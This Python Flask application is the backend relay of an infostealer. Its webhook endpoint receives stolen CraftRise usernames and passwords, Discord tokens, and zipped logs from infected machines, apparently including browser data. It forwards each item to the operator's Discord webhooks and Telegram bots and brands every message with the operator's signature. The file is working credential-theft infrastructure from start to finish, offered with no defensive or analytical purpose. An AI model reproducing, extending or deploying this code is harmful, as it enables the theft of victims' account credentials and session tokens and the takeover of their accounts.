from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")

CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")

MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

# Logo URLs
LOGO_ROBLOX = "https://media.discordapp.net/attachments/1531817920907448421/1535037305939566715/images_3_1.png?ex=6a764e65&is=6a74fce5&hm=8b3af455e1950a192398314266aec70516d4064d7a7677dbae80dd9085e2d6cb&=&format=webp&quality=lossless"
LOGO_CRAFTRISE = "https://media.discordapp.net/attachments/1531817920907448421/1535036471222734941/crlogo.png?ex=6a764d9e&is=6a74fc1e&hm=6a025bc0a51658375ba63d297a82082e8b1ba023df81dab9ade24d052c207967&=&format=webp&quality=lossless"
LOGO_DISCORD = "https://media.discordapp.net/attachments/1531817920907448421/1535036435420413962/discord.png?ex=6a764d95&is=6a74fc15&hm=78731d5637dbc0357394cdd71b663e8e3b052d0ad425b1823f25021175e739e0&=&format=webp&quality=lossless"
LOGO_CHROME = "https://media.discordapp.net/attachments/1531817920907448421/1535044609602756708/images_4.png?ex=6a765532&is=6a7503b2&hm=8734bc5cc340eecedab4941ba667a0306147d88ff84c86d625a37b6522edfc1a&=&format=webp&quality=lossless"
LOGO_EDGE = "https://media.discordapp.net/attachments/1531817920907448421/1535044902948184084/images_2_1.png?ex=6a765578&is=6a7503f8&hm=212e015bccb27d84a428ba4bf0201f7b1de9d806cde5da6675c3b69f13c71b0e&=&format=webp&quality=lossless"
LOGO_OPERA = "https://media.discordapp.net/attachments/1531817920907448421/1535045189196976370/images_5.png?ex=6a7655bc&is=6a75043c&hm=b728ecd032777d556ad36f40a137fda9d1f7f765cd3baa981dd46c3c41149d8f&=&format=webp&quality=lossless"
LOGO_FIREFOX = "https://media.discordapp.net/attachments/1531817920907448421/1535045635890352203/images_6.png?ex=6a765627&is=6a7504a7&hm=c09bac7ab2cbcfb4dc5c51ef087ac79b9937de2bdcd6da85cb1f6b175b44d1aa&=&format=webp&quality=lossless"
LOGO_BRAVE = "https://media.discordapp.net/attachments/1531817920907448421/1535045800181239898/images_7.png?ex=6a76564e&is=6a7504ce&hm=8d5eca472ae9e4fce8cc60b59846ceddccdcb6963c17d17f60eb210bb346474d&=&format=webp&quality=lossless"
LOGO_SIGN = "https://media.discordapp.net/attachments/1531817920907448421/1535048621937000498/JlTlE.jpg?ex=6a7658ef&is=6a75076f&hm=69ba75845e28c680fbe3074e564ad63b4d64a8a11a43cc2a175278e6e0f47a8f&=&format=webp"

def clean_text(text):
    if not text: return ""
    text = re.sub(r'<a?:[a-zA-Z0-9_]+:\d+>', '', str(text))
    text = text.replace("**", "").replace("`", "").replace("*", "").replace("\\_", "_")
    text = text.replace("@everyone", "").replace("@here", "")
    return text.strip()

def send_telegram_msg(token, chat_id, msg):
    if not (token and chat_id and msg): return
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=30)
    except Exception as e:
        print(f"[-] Telegram Mesaj Hatası: {e}")

def send_telegram_file(token, chat_id, file_bytes, filename="backup.zip"):
    if not (token and chat_id and file_bytes): return
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        files = {'document': (filename, file_bytes)}
        requests.post(url, data={"chat_id": chat_id}, files=files, timeout=60)
    except Exception as e:
        print(f"[-] Telegram Dosya Hatası: {e}")

def send_discord_embed(url, embed_data, files_data=None):
    if not url: return
    try:
        if files_data:
            requests.post(url, data=embed_data, files=files_data, timeout=60)
        else:
            requests.post(url, json=embed_data, timeout=30)
    except Exception as e:
        print(f"[-] Discord Embed Hatası: {e}")

def send_discord_with_file(url, content, file_bytes, filename="log.zip"):
    if not url or not file_bytes: return
    try:
        files = {'file': (filename, file_bytes)}
        requests.post(url, data={'content': content}, files=files, timeout=60)
    except Exception as e:
        print(f"[-] Discord Dosya Hatası: {e}")

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        if request.is_json:
            data = request.get_json()
            file_bytes = None
        else:
            data = request.form.to_dict()
            file_bytes = request.files.get('file').read() if request.files.get('file') else None
            for key in ['embeds', 'creds']:
                if key in data and isinstance(data[key], str):
                    try: data[key] = json.loads(data[key])
                    except: pass

        log_type = data.get("type", "unknown")
        hostname = data.get("hostname", "Unknown")
        print(f"[{datetime.now()}] Type: {log_type} | Host: {hostname}")

        embeds = data.get("embeds", [])
        if not isinstance(embeds, list):
            embeds = [embeds] if embeds else []

        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            creds = data.get("creds", {})
            user = creds.get("username", "Unknown") if isinstance(creds, dict) else "Unknown"
            pw = creds.get("password", "Unknown") if isinstance(creds, dict) else "Unknown"
            
            # Discord CraftRise Webhook
            cr_embed = {
                "embeds": [{
                    "title": "🎮 CraftRise Account",
                    "color": 0xFF6B00,
                    "fields": [
                        {"name": f"[🟢]({LOGO_CRAFTRISE}) CraftRise", "value": f"**{user}:{pw}**", "inline": False},
                        {"name": f"[🖋️]({LOGO_SIGN}) İmza", "value": "**S4/Mr.cekikgozlusampiyon - 31makinesii**", "inline": False}
                    ],
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            send_discord_embed(CRAFTRISE_WEBHOOK, cr_embed)
            
            # Telegram
            clean_msg = f"CraftRise\n{user}:{pw}"
            send_telegram_msg(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, clean_msg)

        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            tokens = data.get("tokens", [])
            if isinstance(tokens, str):
                try: tokens = json.loads(tokens)
                except: tokens = [tokens]
            
            if tokens:
                # Discord Webhook
                discord_embed = {
                    "embeds": [{
                        "title": "💬 Discord Tokens",
                        "color": 0x5865F2,
                        "fields": [
                            {"name": f"[🟢]({LOGO_DISCORD}) Discord", "value": f"**{len(tokens)} Token**", "inline": False},
                            {"name": "📦 ZIP", "value": hostname, "inline": False},
                            {"name": f"[🖋️]({LOGO_SIGN}) İmza", "value": "**S4/Mr.cekikgozlusampiyon - 31makinesii**", "inline": False}
                        ],
                        "timestamp": datetime.utcnow().isoformat()
                    }]
                }
                send_discord_embed(DISCORD_WEBHOOK, discord_embed)
                
                # Telegram (her token tek tek)
                for i, token in enumerate(tokens):
                    send_telegram_msg(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, f"DISCORD\nTOKEN - {token}")

        # ============ MASTER ============
        else:
            # Master Webhook'a gönder (2. görseldeki gibi)
            if embeds:
                for embed in embeds:
                    # İmza ekle
                    if "fields" in embed:
                        embed["fields"].append({
                            "name": f"[🖋️]({LOGO_SIGN}) İmza",
                            "value": "**S4/Mr.cekikgozlusampiyon - 31makinesii**",
                            "inline": False
                        })
                    
                    if "footer" not in embed:
                        embed["footer"] = {"text": "S4/Mr.cekikgozlusampiyon - 31makinesii"}
            
            # Master Webhook
            if file_bytes:
                send_discord_with_file(MASTER_WEBHOOK, data.get("content", ""), file_bytes)
                send_discord_with_file(WEBHOOK, data.get("content", ""), file_bytes)
                send_telegram_file(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
                send_telegram_file(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
            else:
                send_discord_embed(MASTER_WEBHOOK, {"embeds": embeds})
                send_discord_embed(WEBHOOK, {"embeds": embeds})

        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[-] Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home(): return "Proxy Active"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
